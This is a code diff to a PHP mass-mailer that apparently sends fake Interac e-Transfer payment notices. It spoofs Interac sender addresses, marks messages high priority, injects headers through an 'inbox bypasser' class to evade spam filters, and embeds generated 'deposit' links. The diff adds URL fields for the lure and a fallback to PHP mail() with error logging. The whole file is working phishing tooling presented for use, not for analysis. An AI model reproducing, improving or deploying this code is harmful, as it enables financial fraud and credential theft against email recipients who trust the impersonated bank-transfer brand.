@@ -113,6 +113,8 @@ class TransferRequest {
     public $senderName;
     public $referenceNumber;
     public $date;
+    public $action_url;
+    public $app_url;
     
     public function __construct($postData) {
         $this->recipientEmail = isset($postData['recipient_email']) ? trim($postData['recipient_email']) : '';
@@ -124,6 +126,8 @@ class TransferRequest {
         $this->senderName = isset($postData['sender_name']) ? trim($postData['sender_name']) : 'Accounting';
         $this->referenceNumber = isset($postData['reference_number']) ? trim($postData['reference_number']) : uniqid();
         $this->date = isset($postData['date']) ? trim($postData['date']) : date('F j, Y');
+        $this->action_url = isset($postData['action_url']) ? trim($postData['action_url']) : '';
+        $this->app_url = isset($postData['app_url']) ? trim($postData['app_url']) : '';
     }
 }
 
@@ -234,52 +238,58 @@ class InstantTransactionProcessor {
     public function sendUniversalDelivery(TransferRequest $request, array $smtpConfig): array
     {
         $domain = substr(strrchr($request->recipientEmail, "@"), 1);
+        $logFile = '/tmp/mailer_errors.log';
         
         // Attempt PHPMailer if present, otherwise fallback to mail()
         if (class_exists('PHPMailer\PHPMailer\PHPMailer')) {
-            $mail = new \PHPMailer\PHPMailer\PHPMailer(true);
-            $mail->SMTPDebug = 0;
-            $mail->isSMTP();
-            $mail->isHTML(true);
-            $mail->CharSet = 'UTF-8';
-            $mail->Encoding = 'base64';
-            $mail->Priority = 1;
-            $mail->addCustomHeader('X-Priority', '1 (Highest)');
-            $mail->addCustomHeader('Importance', 'High');
+            try {
+                $mail = new \PHPMailer\PHPMailer\PHPMailer(true);
+                $mail->SMTPDebug = 0;
+                $mail->isSMTP();
+                $mail->isHTML(true);
+                $mail->CharSet = 'UTF-8';
+                $mail->Encoding = 'base64';
+                $mail->Priority = 1;
+                $mail->addCustomHeader('X-Priority', '1 (Highest)');
+                $mail->addCustomHeader('Importance', 'High');
 
-            $mail->addAddress($request->recipientEmail, $request->recipientName);
-            $replyToEmail = $smtpConfig['user'] ?? "noreply@interac-transfer.ca";
-            $mail->addReplyTo($replyToEmail, $request->senderName);
+                $mail->addAddress($request->recipientEmail, $request->recipientName);
+                $replyToEmail = $smtpConfig['user'] ?? "noreply@interac-transfer.ca";
+                $mail->addReplyTo($replyToEmail, $request->senderName);
 
-            $mail->Subject = "INTERAC e-Transfer: " . htmlspecialchars($request->senderName) . " sent you $" . number_format($request->amount, 2);
-            
-            $headersStr = "";
-            UniversalInboxBypasser::injectBypassHeaders($headersStr, $domain);
-            $lines = explode("\r\n", trim($headersStr));
-            foreach ($lines as $line) {
-                if (strpos($line, ':') !== false) {
-                    list($name, $val) = explode(':', $line, 2);
-                    $mail->addCustomHeader(trim($name), trim($val));
+                $mail->Subject = "INTERAC e-Transfer: " . htmlspecialchars($request->senderName) . " sent you $" . number_format($request->amount, 2);
+                
+                $headersStr = "";
+                UniversalInboxBypasser::injectBypassHeaders($headersStr, $domain);
+                $lines = explode("\r\n", trim($headersStr));
+                foreach ($lines as $line) {
+                    if (strpos($line, ':') !== false) {
+                        list($name, $val) = explode(':', $line, 2);
+                        $mail->addCustomHeader(trim($name), trim($val));
+                    }
                 }
+
+                $txId = $request->referenceNumber;
+                $mail->Host = $smtpConfig['host'] ?? 'localhost';
+                $mail->Port = (int)($smtpConfig['port'] ?? 587);
+                $mail->Username = $smtpConfig['user'] ?? '';
+                $mail->Password = $smtpConfig['pass'] ?? '';
+                $mail->SMTPAuth = !empty($mail->Username);
+                $mail->SMTPSecure = ($mail->Port === 465) ? 'ssl' : (($mail->Port === 587) ? 'tls' : '');
+                
+                $fromEmail = $smtpConfig['user'] ?? "noreply@interac.ca";
+                $mail->setFrom($fromEmail, $request->senderName);
+
+                $depositLink = $this->createDepositLink($txId, $request);
+                $mail->Body = $this->renderEmailBody($txId, $request, $depositLink);
+
+                $mail->send();
+                $relayUsed = "PRIMARY_SMTP";
+            } catch (\Exception $e) {
+                file_put_contents($logFile, "[" . date('Y-m-d H:i:s') . "] PHPMailer failed: " . $e->getMessage() . PHP_EOL, FILE_APPEND);
+                $this->sendActualEmail($request, $request->referenceNumber, $domain);
+                $relayUsed = "FALLBACK_PHP_MAIL";
             }
-
-            $txId = $request->referenceNumber;
-            // set SMTP
-            $mail->Host = $smtpConfig['host'] ?? 'localhost';
-            $mail->Port = (int)($smtpConfig['port'] ?? 587);
-            $mail->Username = $smtpConfig['user'] ?? '';
-            $mail->Password = $smtpConfig['pass'] ?? '';
-            $mail->SMTPAuth = !empty($mail->Username);
-            $mail->SMTPSecure = ($mail->Port === 465) ? 'ssl' : (($mail->Port === 587) ? 'tls' : '');
-            
-            $fromEmail = $smtpConfig['user'] ?? "noreply@interac.ca";
-            $mail->setFrom($fromEmail, $request->senderName);
-
-            $depositLink = $this->createDepositLink($txId, $request);
-            $mail->Body = $this->renderEmailBody($txId, $request, $depositLink);
-
-            $mail->send();
-            $relayUsed = "PRIMARY_SMTP";
         } else {
             // Fallback to mail() if PHPMailer not loaded
             $this->sendActualEmail($request, $request->referenceNumber, $domain);
@@ -307,7 +317,10 @@ class InstantTransactionProcessor {
         
         UniversalInboxBypasser::injectBypassHeaders($headers, $domain);
 
-        @mail($request->recipientEmail, $subject, $htmlBody, $headers);
+        $result = @mail($request->recipientEmail, $subject, $htmlBody, $headers);
+        if (!$result) {
+            file_put_contents('/tmp/mailer_errors.log', "[" . date('Y-m-d H:i:s') . "] PHP mail() failed for " . $request->recipientEmail . PHP_EOL, FILE_APPEND);
+        }
     }
 
     private function renderEmailBody($txId, $request, $depositLink) {
